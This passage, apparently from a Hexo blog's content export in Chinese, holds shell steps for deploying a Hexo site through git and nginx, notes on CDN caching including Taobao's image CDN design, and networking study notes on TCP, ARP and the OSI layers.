clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s --debug</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">把本地blog上传到github</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">github创建仓库blog</span></span><br><span class="line">cd blog</span><br><span class="line">git init</span><br><span class="line">git add .</span><br><span class="line">git commit -m &quot;first commit&quot;</span><br><span class="line">git rm -f --cached themes/next</span><br><span class="line">git submodule add https://github.com/next-theme/hexo-theme-next.git themes/next</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将本地项目与远程仓库关联</span></span><br><span class="line">git remote add origin https://github.com/pure-cyc/blog.git</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">第一次提交需要-u，该-u标志添加了对您推送到的上游服务器的跟踪引用。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">一旦你做了一个git push -u origin master，你可以稍后调用git pull，git 就会知道你实际上是指git pull origin master.</span></span><br><span class="line">git push -u origin master</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编写pushAndDeployment.sh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">git add .</span><br><span class="line">time=$(date &quot;+%Y-%m-%d %H:%M:%S&quot;)</span><br><span class="line">echo &quot;Site updated: $&#123;time&#125;&quot;</span><br><span class="line">git commit -m &quot;Site updated: $&#123;time&#125;&quot;</span><br><span class="line">echo &quot;Commit success&quot;</span><br><span class="line">git push</span><br><span class="line">echo &quot;Push success&quot;</span><br><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br><span class="line">echo &quot;Deployment success&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">部署</span></span><br><span class="line">cd blog</span><br><span class="line">./pushAndDeployment.sh</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">部署到服务器上</span></span><br><span class="line">yum install nginx git</span><br><span class="line"></span><br><span class="line">mkdir /var/repo</span><br><span class="line"></span><br><span class="line">chmod 755 /var/repo</span><br><span class="line"></span><br><span class="line">mkdir /var/blog</span><br><span class="line">chmod 755 /var/blog</span><br><span class="line"></span><br><span class="line">cd /var/repo</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建一个空白的git仓库</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1.git init 创建本地仓库(在工程目录下创建)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2.git init --bare 创建远端仓库（在服务器或者工程目录以外路径都可以创建的备份仓库）</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">工程commit到1中，push到2中；</span></span><br><span class="line">git init --bare blog.git</span><br><span class="line"></span><br><span class="line">vim /var/repo/blog.git/hooks/post-receive</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">git --work-tree=/var/blog --git-dir=/var/repo/blog.git checkout -f</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">给post-receive添加执行权限</span></span><br><span class="line">chmod +x /var/repo/blog.git/hooks/post-receive</span><br><span class="line"></span><br><span class="line">cd /etc/nginx/conf.d/</span><br><span class="line">vim blog.conf</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen    80;</span><br><span class="line">    listen    [::];</span><br><span class="line">    server_name  www.mingwzi.cn;</span><br><span class="line">    root    /var/blog;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nginx -t</span><br><span class="line"></span><br><span class="line">nginx -s reload</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">mac</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改Hexo的deploy配置</span></span><br><span class="line">cd blog</span><br><span class="line">vim _config.yml</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">找到deploy配置部分</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Deployment</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># Docs: https://hexo.io/docs/deployment.html</span></span></span><br><span class="line">deploy:</span><br><span class="line">- type: git</span><br><span class="line">  repo: root@81.68.97.129:/var/repo/blog.git # IP填写自己服务器的IP即可</span><br><span class="line">  branch: master</span><br><span class="line">- type: git</span><br><span class="line">  repo: https://github.com/HuangMingwang/HuangMingwang.github.io.git</span><br><span class="line">  branch: master</span><br><span class="line">- type: git</span><br><span class="line">  repo: root@43.154.81.112:/var/repo/blog.git</span><br><span class="line">  branch: master</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hexo 安装butterfly主题</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在hexo根目录下</span></span><br><span class="line">git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改hexo根目录下的_config.yml</span></span><br><span class="line">theme: butterfly</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装 pug 以及 stylus 的渲染器</span></span><br><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加备案号</span></span><br><span class="line">cd themes/butterfly/layout/includes/</span><br><span class="line">vim footer.pug</span><br><span class="line"></span><br><span class="line">span.footer-separator |</span><br><span class="line">&lt;a href=&quot;https://beian.miit.gov.cn/&quot; target=&quot;_blank&quot;&gt;赣ICP备2022001353号-1&lt;/a&gt;</span><br></pre></td></tr></table></figure>



<h2 id="配置CDN"><a href="#配置CDN" class="headerlink" title="配置CDN"></a>配置CDN</h2><p>真实名称记录（英语：Canonical Name Record），即CNAME记录，是域名系统（DNS）的一种记录。CNAME记录用于将一个域名（同名）映射到另一个域名（真实名称），域名解析服务器遇到CNAME记录会以映射到的目标重新开始查询。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202191129397.png" alt="img"></p>
<ol>
<li>用户向 <code>www.test.com</code> 下的某图片资源（如：1.jpg）发起请求，会先向 Local DNS 发起域名解析请求。</li>
<li>当 Local DNS 解析 <code>www.test.com</code> 时，会发现已经配置了 CNAME <code>www.test.com.cdn.dnsv1.com</code>，解析请求会发送至 Tencent DNS（GSLB），GSLB 为腾讯云自主研发的调度体系，会为请求分配最佳节点 IP。</li>
<li>Local DNS 获取 Tencent DNS 返回的解析 IP。</li>
<li>用户获取解析 IP。</li>
<li>用户向获取的 IP 发起对资源 1.jpg 的访问请求。</li>
<li>若该 IP 对应的节点缓存有 1.jpg，则会将数据直接返回给用户（10），此时请求结束。若该节点未缓存 1.jpg，则节点会向业务源站发起对 1.jpg 的请求（6、7、8），获取资源后，结合用户自定义配置的缓存策略（可参考产品文档中的 <a href="https://cloud.tencent.com/doc/product/228/6290">缓存过期配置</a>），将资源缓存至节点（9），并返回给用户（10），此时请求结束。</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -o /dev/test -s -w %&#123;time_namelookup&#125;::%&#123;time_connect&#125;::%&#123;time_starttransfer&#125;::%&#123;time_total&#125;::%&#123;speed_download&#125;&quot;\n&quot; &quot;http://www.mingwzi.cn&quot; </span><br></pre></td></tr></table></figure>





<h3 id="cdn使用任播技术可以分摊流量，防御ddos攻击？"><a href="#cdn使用任播技术可以分摊流量，防御ddos攻击？" class="headerlink" title="cdn使用任播技术可以分摊流量，防御ddos攻击？"></a>cdn使用任播技术可以分摊流量，防御ddos攻击？</h3><h3 id="源站内容发生变更，cdn如何感知到？"><a href="#源站内容发生变更，cdn如何感知到？" class="headerlink" title="源站内容发生变更，cdn如何感知到？"></a>源站内容发生变更，cdn如何感知到？</h3><h3 id="CDN的加速方式？"><a href="#CDN的加速方式？" class="headerlink" title="CDN的加速方式？"></a>CDN的加速方式？</h3><p>距离近，文件压缩，</p>
<p>cdn可以省钱，可以少走很多路</p>
<p>….</p>
<h3 id="淘宝图片空间和CDN的架构"><a href="#淘宝图片空间和CDN的架构" class="headerlink" title="淘宝图片空间和CDN的架构"></a>淘宝图片空间和CDN的架构</h3><p>淘宝整个图片的访问链路有<a href="https://www.zhihu.com/search?q=%E4%B8%89%E7%BA%A7%E7%BC%93%E5%AD%98&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1604554133%7D">三级缓存</a>（客户端本地、CDN L1、CDN L2），所有图片都持久化的存储到OSS中。真正处理图片的是<a href="https://www.zhihu.com/search?q=img-picasso%E7%B3%BB%E7%BB%9F&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1604554133%7D">img-picasso系统</a>，它的功能比较复杂，包括从OSS读取文件，对图片尺寸进行缩放，编解码，所以机器成本比较高。</p>
<p>CDN的缓存分成2级，合理的分配L1和L2的比例，一方面，可以通过一致性hash的手段，在同等资源的情况下，缓存更多内容，提升整体缓存命中率；另一方面，可以平衡计算和IO，充分利用不同配置的机器的能力。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202191458499.jpg" alt="img"></p>
<p>用户访问图片的过程如下：<br>（1）用户通过手机淘宝来搜索商品或者查看宝贝详情。<br>（2）详情&#x2F;搜索&#x2F;推荐通过调用商品中心返回商品的<a href="https://www.zhihu.com/search?q=%E5%9B%BE%E7%89%87UR&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1604554133%7D">图片UR</a>L。<br>（3）客户端本地如果有该图片的缓存，则直接渲染图片，否则执行下一步。<br>（4）从CDN L1回源图片，如果L1有该图片的缓存，则客户端渲染图片，同时缓存到本地，如果L1没有缓存，则执行下一步。<br>（5）从CDN L2回源图片，如果L2有该图片的缓存，则客户端渲染图片，同时CDN L1及客户端缓存图片内容，如果CDN L2没有缓存该图片，则执行下一步。<br>（6）从图片空间回源图片，图片空间会从OSS拉取图片源文件，按要求进行尺寸缩放，然后执行编解码，返回客户端能够支持的图片内容，之后客户端就可以渲染图片，同时CDN的L1、L2以及客户端都会缓存图片内容。</p>
<h4 id="频繁换图带来的技术挑战"><a href="#频繁换图带来的技术挑战" class="headerlink" title="频繁换图带来的技术挑战"></a>频繁换图带来的技术挑战</h4><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202191458642.jpg" alt="img"></p>
<p>当商品的价格发生变化时，我们会使用新的价格重新合成图片，更新商品中心中存储的图片URL。</p>
<p>这样会带来2个问题：<br>（1）CDN及手机淘宝原本缓存的图片内容失效了，用户访问图片会全部回源到img-picasso。<br>（2）由于更改了商品的字段，交易的核心应用（购物车和商品中心）的缓存也失效了，用户浏览及购物时，对商品的访问会走到db。</p>
<p>源站img-picasso处理图片，以及查询商品DB，都是非常消耗资源的。CDN及商品的缓存命中率降低后，对源站img-picsasso以及db会产生巨大的压力。</p>
<p>拿CDN缓存为例，简单计算一下，CDN平时的命中率是98%，假设命中率降低1个点，对源站的压力就会增加1&#x2F;3（原本承担2%的流量，现在需要承担3%的流量），意味着img-picasso需要扩容1&#x2F;3。如果全网一半的图片都同时变化，cdn的命中率降到50%，对img-picasso的访问量就会增加25倍，这个扩容成本肯定没法接受。</p>
<p>解决这2个问题，对应的有2个办法：<br>（1）改图保持图片URL不变，可以避免<a href="https://www.zhihu.com/search?q=%E5%95%86%E5%93%81%E9%93%BE%E8%B7%AF&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1604554133%7D">商品链路</a>的缓存失效。<br>（2）在访问高峰到来之前，提前预热图片到CDN，可以避免CDN缓存失效对源站的压力。</p>
<p>下面，介绍下我们具体是怎么做到这2点的。</p>
<h4 id="频繁换图的应对方案"><a href="#频繁换图的应对方案" class="headerlink" title="频繁换图的应对方案"></a>频繁换图的应对方案</h4><p><strong>改图保持图片URL不变</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202191458800.jpg" alt="img"></p>
<p>图片内容发生变化时，执行下面2个操作：<br>（1）更新OSS内容：使用新的图片内容替换OSS中老的图片内容<br>（2）刷新CDN缓存：清除CDN之前缓存的图片内容</p>
<p>这样，用户再次访问图片时，发现CDN没有缓存，就会回源到img-picasso，从OSS拉取新的图片内容。</p>
<p>由于图片URL没有变化，就不必去更新商品中心的图片链接，这样商品链路的缓存可以保持不变。<br>在真正实施这个方案的过程中，遇到了几个问题，简单跟大家分享下：</p>
<p><strong>OSS三地同步</strong></p>
<p>淘宝的图片空间，承载了淘系所有图片的上下行稳定性保障，为了保障高可用，一份资源会存储到三地OSS。图片上传时，默认只上传一地，利用OSS的能力，自动同步到另外两地。</p>
<pre><code> 但是使用URL不变方案，CDN缓存已经清除完成后，如果另外2地的OSS还未同步完成，用户访问后，就会回源到旧的图片内容，发现图片内容没有变化。


  针对该问题，我们将异步同步OSS软链的模式，改成三地同步建软链，三地都返回成功后，再去清除CDN缓存，这就保证了用户访问的图片一定是最新的内容。
</code></pre>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202191458123.jpg" alt="img"></p>
<p><strong>图片尺寸收敛</strong></p>
<p>同一张商品图片会用于不同的场景坑位展现，不同的坑位对图片的尺寸有不同的要求。为此，图片空间提供了一项功能，可以方便的生成不同尺寸的缩率图。只需要访问图片时，给图片增加不同的后缀，img-picasso源站就可以按要求进行图片进行缩放。</p>
<p>由于历史原因，之前对缩放的尺寸种类没有限制，导致CDN上的图片后缀格式多达2400种+，TOP6格式覆盖率46%，TOP15格式覆盖率64%。这意味着，一张图片，在cdn上最多可能有2400+个不同的url，当图片内容变化后，要把这些缓存全部清掉，才能保证所有用户看到的图片都是新内容。</p>
<p>为了解决这个问题，我们对域名格式进行了收敛。</p>
<p>图片空间对于图片质量压缩参数的规则如下：</p>
<ul>
<li>图片质量参数常见有一下8种形式：Q90、Q75、Q50、Q30、q90、q75、q50、q30</li>
<li>图片锐化参数常见有一下3种形式：s100，s150，s200</li>
</ul>
<p>我们重新将图片质量定义为高质量图片和低质量图片，收敛格式为 q90 和 p50s150<br>这样，就可以把2000多种格式收敛到6种主要格式，CDN清除缓存才变得可行。</p>
<p><strong>多副本清除CDN缓存</strong><br>通过图片尺寸收敛，每张图片只需要清除6个不同的url就可以了，那能不能进一步提升刷新效率呢？<br>为此，阿里云CDN为我们提供了多副本刷新的解决方案：每种不同后缀的图片，作为图片的一个副本，在CDN的swift层增加一层KV结构，存储url和不同副本的映射关系，清除缓存时，可以通过该结构找到所有副本，实现快速清除所有副本。这样，每张图片，我们只需要调用一次CDN清除缓存接口就可以了，极大提升了CDN缓存刷新效率。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202191458324.jpg" alt="img"></p>
<p><strong>图片域名收敛</strong></p>
<p>淘系的图片域名有300多种，主要有下面2个原因：<br>（1）图片完整的链接太长，所以存储时经常只存最后一段，业务自己来拼域名，很多业务就自己申请了一个图片域名来拼。<br>（2）PC时代，浏览器对同一域名下的并发请求数是有限制的，不同浏览器不一样，一般6个左右。</p>
<p>为了突破该限制，一些业务就会申请多个域名，随机的拼不同的域名。</p>
<p>前面我们讲过，CDN的缓存是跟域名绑定的，不管是缓存命中还是缓存清除，都只能针对一个域名。</p>
<p>我们显然不可能改一张图，就去对300个域名调用CDN刷新。于是我们考虑对图片域名进行收敛，使得用户对图片的访问都路由到同一个域名，我们希望将所有的图片访问统一收敛到<a href="https://link.zhihu.com/?target=http://picasso.alicdn.com">http://picasso.alicdn.com</a>，具体实现方式如下：</p>
<p>（1）对于手淘和猫客客户端，图片访问都收口在图片库，我们推进图片库进行改造，符合一定规则的url，统一收敛到<a href="https://link.zhihu.com/?target=http://picasso.alicdn.com">http://picasso.alicdn.com</a>，实现了域名的一刀切。<br>（2）对于PC浏览器端，就比较麻烦了，没有统一收口的地方。我们只能退而求其次，针对访问最多的6大域名，在cdn上配置域名转发规则，重定向到<a href="https://www.zhihu.com/search?q=picasso%E5%9F%9F%E5%90%8D&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1604554133%7D">picasso域名</a>。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202191458380.jpg" alt="img"></p>
<p>通过这种方式，我们实现了全网99%以上的图片访问流量都路由到picasso域名，图片内容发生变化时，通过清除picasso域名的<a href="https://www.zhihu.com/search?q=cdn%E7%BC%93%E5%AD%98&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1604554133%7D">cdn缓存</a>，就能保证基本所有的场景都能看到新的图片内容。</p>
<h4 id="客户端及浏览器缓存"><a href="#客户端及浏览器缓存" class="headerlink" title="客户端及浏览器缓存"></a>客户端及浏览器缓存</h4><p>通过多副本和图片域名收敛，cdn的缓存问题得到了解决。但在cdn之上，用户图片访问首先是来自客户端或者浏览器，这里也会有一层缓存。</p>
<p>大家知道，浏览器的缓存都遵循标准的http max-age协议，指定该header后，到了时间图片就会失效，访问到新的图片。所以我们可以在源站img-picasso回源给cdn时，添加max-age协议头，值为1分钟，cdn会原封不动的透给浏览器，这样浏览器就可以实现1分钟内<a href="https://www.zhihu.com/search?q=%E5%9B%BE%E7%89%87%E7%BC%93%E5%AD%98&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1604554133%7D">图片缓存</a>失效，重新到cdn拉新的图片资源。</p>
<p>对于手机淘宝客户端，我们在原有的LRU缓存机制之上，另外支持标准的http协议。这样，手机淘宝也实现了1分钟内图片缓存失效。</p>
<p><strong>提前预热CDN图片</strong></p>
<p>通过改图保持图片URL不变，我们解决了改图对商品链路缓存的影响。但是，图片变化时，虽然URL没有变，但我们清除了CDN缓存，导致用户访问时还是会回源到img-picasso源站，所以对图片源站的压力依然存在。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202191458478.jpg" alt="img"></p>
<p>我们发现，商品的价格变化大部分发生在大促节奏变化的时刻，基于这个特点，我们通过提前合成图片，提前预热到CDN，可以实现图片切换瞬间生效，同时对源站没有压力。</p>
<p>具体方案如下：<br>（1）提前合成多波段图片：我们知道大促期间商家集中换图的时间点后，按这些时间点把图片的展示分成多个波段，每个波段图片提前合成，并提前将图片URL写入到商品中心扩展结构中。<br>（2）图片访问路由：营销系统根据配置的大促氛围切换计划，告诉鹿班图片二方包，当前是哪个波段，鹿班根据当前波段及场景，返回正确的图片URL给各个场景。<br>（3）图片渲染：各个场景拿到图片URL后，结合自身的业务逻辑，决定是否要展现该图片。<br>（4）CDN图片预热：为了避免图片集中切换时，把源站击垮，我们会在集中切换前把这些冷图片内容预热到CDN。<br>（5）波段内图片变化：提前合成各个波段图片后，商家可能会临时发券&#x2F;改价，导致商品价格再次变化，对于这类换图需求，为了避免更新商品中心的图片URL，我们通过本文上一章节刷CDN缓存的方式实现。</p>
<h4 id="总结和展望"><a href="#总结和展望" class="headerlink" title="总结和展望"></a>总结和展望</h4><p><a href="https://www.zhihu.com/search?q=CDN%E6%8A%80%E6%9C%AF&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1604554133%7D">CDN技术</a>广泛应用于互联网的各个场景，如今的CDN服务商，都提供了非常简单的业务接入方式，而且CDN的费用每年都在降低，这一切使得CDN的接入和使用成本越来越低。</p>
<p>淘宝的图片业务除了访问量大，还会面临更新频繁的问题。图片的频繁更新，一方面会由于商品上的图片url变化，导致商品缓存失效，另一方面会大幅降低CDN的图片访问缓存命中率。<br>针对图片url变化导致商品缓存失效的问题，我们通过刷新cdn缓存，用户访问时重新回源的方式，实现了改图保持图片url不变，这个过程中了，我们解决了一些列的问题，包括：OSS三地同步更新、图片尺寸收敛、图片域名收敛、客户端及浏览器<a href="https://www.zhihu.com/search?q=%E6%9C%AC%E5%9C%B0%E7%BC%93%E5%AD%98&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:1604554133%7D">本地缓存</a>。<br>针对改图降低CDN图片缓存命中率的问题，我们根据业务的特点，提前合成不同波段的图片，并预热到CDN，保障了源站的安全。</p>
<p>目前，淘宝上用户看到的图片，都是提前合成好的。未来，我们考虑在用户访问图片时，实时合成图片。通过这项技术，可以实时感知业务更多的实时信息，可以根据这些信息，在图片上合成当前用户或者环境更匹配的文案&#x2F;元素等内容，给用户带来更多的惊喜。<br>当然，实时合图也会面临更多的挑战，如：计算能力、合图性能。此外，对于CDN而言，由于每次用户访问的内容是临时合成的，CDN的缓存策略也是一个很大的挑战。</p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>blog</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机网络</title>
    <url>/2022/03/17/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="计算机网络"><a href="#计算机网络" class="headerlink" title="计算机网络"></a>计算机网络</h1><p>有状态：<br>A：你今天中午吃的啥？<br>B：吃的大盘鸡。<br>A：味道怎么样呀？<br>B：还不错，挺好吃的。</p>
<p>无状态：<br>A：你今天中午吃的啥？<br>B：吃的大盘鸡。<br>A：味道怎么样呀？<br>B：？？？啊？啥？啥味道怎么样？</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848125.png" alt="img"></p>
<p>在发送方，SSL接受应用层的数据（如http或IMap报文），对数据进行加密，然后把加了密的数据送往TCP套接字。 在接受方，SSL从TCP套接字读取数据，解密后把数据交给应用层。</p>
<p>在Internet上传输音频视频面临的问题？ 占用的带宽高，网速需要恒定，延迟低，数据信息。</p>
<p>网络层防火墙：基于数据包，源地址 目标地址，协议和端口，控制流量</p>
<p>应用层防火墙：数据包 原地址 目标地址 协议 端口 用户名 时间段 内容 防病毒进入内网</p>
<p>QOS(quality of service)</p>
<p>TCP协议是一个面向连接的、可靠的传输协议，它提供一种可靠的字节流，能保证数据完整、无损并且按顺序到达。TCP尽量连续不断地测试网络的负载并且控制发送数据的速度以避免网络过载。另外，TCP试图将数据按照规定的顺序发送。</p>
<p>UDP协议是一个无连接的数据报协议，是一个“尽力传递”和“不可靠”协议，不会对数据包是否已经到达目的地进行检查，并且不保证数据包按顺序到达。</p>
<p>总体来说，TCP协议传输效率低，但可靠性强；UDP协议传输效率高，但可靠性略低，适用于传输可靠性要求不高、体量小的数据（比如QQ聊天数据）。</p>
<p>集线器: 无脑转发，通过查看mac看是否是给自己的数据包，不是就丢弃</p>
<p>交换机: 可以自学习，能够通过mac地址定向转发</p>
<p>默认网关: 就是在自己电脑里配置的一个 IP 地址，以便在发给不同子网的机器时，发给这个 IP 地址。</p>
<p>arp : 每台电脑都有一个arp缓存表，电脑 A 为了知道电脑 B（192.168.0.2）的 MAC 地址，将会<strong>广播</strong>一条 arp 请求，B 收到请求后，带上自己的 MAC 地址给 A 一个<strong>响应</strong>。此时 A 便更新了自己的 arp 表。</p>
<p>Vpn: 数据包里包含数据包</p>
<h2 id="马士兵"><a href="#马士兵" class="headerlink" title="马士兵"></a>马士兵</h2><p>有可能ack+fin包一起发， 4次挥手的时候可能只抓到3个包;</p>
<p>61.135.169.121 先和路由表的第一个mask做按位与，然后与网络号192.168.150.0对比， 不对; 然后这条记录作废;</p>
<p>再和0.0.0.0做按位与， 等于destination， 然后知道应该转发到192.168.150.2， 但是这个不能把目标地址直接改为192.168.150.2， 这个时候就需要数据链路层， 在数据链路层再套一层mac地址;</p>
<p>ip地址是一直不变的，mac地址一直在替换， ip是端到端， mac地址是节点到节点之间;</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848243.png" alt="截屏2021-05-14 下午8.38.07"></p>
<p>在物理层会先加一个前导码， 前导码的作用就是告诉接收端接下来的数据是帧数据，它是用来分隔两个帧的标志。一是让接收端快速判断接收到的一帧数据格式是否是正确的，因为每一帧必然是前导码开头，如果不是，那么数据肯定有问题。二是在发现数据有问题时，能够快速找到下一帧的起始点，从而知道要丢弃多少错误数据。</p>
<p>nc <a href="http://www.baidu.com/">www.baidu.com</a> 80</p>
<p>相当于浏览器链接上了百度的80端口，然后按照http协议发送东西过去， 它就会回复</p>
<p>curl <a href="http://www.baidu.com/">www.baidu.com:80</a></p>
<p>curl相当于封装了好几个指令， 直接访问百度，然后断开， 走完整个生命周期;</p>
<h3 id="ARP过程"><a href="#ARP过程" class="headerlink" title="ARP过程"></a>ARP过程</h3><p>ARP（Address Resolution Protocol，地址解析协议）</p>
<p>在局域网中，当主机或其它网络设备有数据要发送给另一个主机或设备时，它必须知道对方的网络层地址（即IP地址）。但是仅仅有IP地址是不够的，因为IP数据报文必须封装成帧才能通过物理网络发送，因此发送站还必须有接收站的物理地址，所以需要一个从IP地址到物理地址的映射。APR就是实现这个功能的协议。</p>
<p> 假设主机A和B在，主机A要向主机B发送信息。具体的地址解析过程如下  </p>
<ul>
<li><p>主机A首先查看自己的ARP表，确定其中是否包含有主机B对应的ARP表项。如果找到了对应的MAC地址，则主机A直接利用ARP表中的MAC地址，对IP数据包进行帧封装，并将数据包发送给主机B。 </p>
</li>
<li><p>如果主机A在ARP表中找不到对应的MAC地址，则将缓存该数据报文，然后以广播方式发送一个ARP请求报文。ARP请求报文中的发送端IP地址和发送端MAC地址为主机A的IP地址和MAC地址，目标IP地址和目标MAC地址为主机B的IP地址和全0的MAC地址。由于ARP请求报文以广播方式发送，该网段上的所有主机都可以接收到该请求，但只有被请求的主机（即主机B）会对该请求进行处理。</p>
</li>
<li><p>主机B比较自己的IP地址和ARP请求报文中的目标IP地址，当两者相同时进行如下处理：将ARP请求报文中的发送端（即主机A）的IP地址和MAC地址存入自己的ARP表中。之后以<strong>单播</strong>方式发送ARP响应报文给主机A，其中包含了自己的MAC地址。</p>
</li>
<li><p>主机A收到ARP响应报文后，将主机B的MAC地址加入到自己的ARP表中以用于后续报文的转发，同时将IP数据包进行封装后发送出去。 </p>
</li>
<li><p>当主机A和主机B不在一个网段时，主机A就会先向网关发出ARP请求，ARP请求报文中的目标IP地址为网关的IP地址。当主机A从收到的响应报文中获得网关的MAC地址后，将报文封装并发给网关。如果网关没有主机B的ARP表项，网关会广播ARP请求，目标IP地址为主机B的IP地址，当网关从收到的响应报文中获得主机B的MAC地址后，就可以将报文发给主机B；如果网关已经有主机B的ARP表项，网关直接把报文发给主机B。 未知目的MAC的时候，目的Mac可以是：ffff.ffff.ffff.ffff</p>
</li>
</ul>
<h3 id="单臂路由"><a href="#单臂路由" class="headerlink" title="单臂路由"></a>单臂路由</h3><p>一个网卡可以通向两个网络</p>
<h3 id="socket"><a href="#socket" class="headerlink" title="socket"></a>socket</h3><p>socket是一个4元组， 用4元组描述;</p>
<p>客户端连接服务器80端口能有65535个， 连接90也有65535个， 如果客户端有好几个ip地址就能可以实现百万连接</p>
<h2 id="OSI七层"><a href="#OSI七层" class="headerlink" title="OSI七层"></a>OSI七层</h2><p>物联网苏汇试用</p>
<h3 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h3><p> 通过应用进程的及交互来完成特定网络应用; 应用进程间的通信和交互规则; 不同的网络应用需要不用的应用协议， DNS，HTTP，SMTP; 应用层交互的数据单元称为报文</p>
<h3 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h3><p>负责向两台主机进程之间的通信提供通用的数据传输服务; 应用进程利用该服务传送应用层报文; 通用是指多种应用可以使用同一个运输层服务; </p>
<p>由于一台主机可同时运行多个线程，因此运输层有复用和分用的功能。所谓复用就是指多个应用层进程可同时使用下面运输层的服务，分用和复用相反，是运输层把收到的信息分别交付上面应用层中的相应进程。</p>
<h3 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h3><p>在计算机网络中进行通行的两个计算机之间可能会经过多个数据链路， 也能会经过多个通信子网， 网络层的任务就会选择合适的网间路由和交换节点; 在发送数据时， 网络层把运输层参生的报文段或用户数据报封装成分组和包进行传送; 在TCP&#x2F;IP协议中， 由于网络层使用ip协议， 因此分组也叫IP数据包， 简称数据报;</p>
<h3 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h3><p><strong>数据链路层(data link layer)通常简称为链路层。两台主机之间的数据传输，总是在一段一段的链路上传送的，这就需要使用专门的链路层的协议。</strong> 在两个相邻节点之间传送数据时，<strong>数据链路层将网络层交下来的 IP 数据报组装成帧</strong>，在两个相邻节点间的链路上传送帧。每一帧包括数据和必要的控制信息（如同步信息，地址信息，差错控制等）。</p>
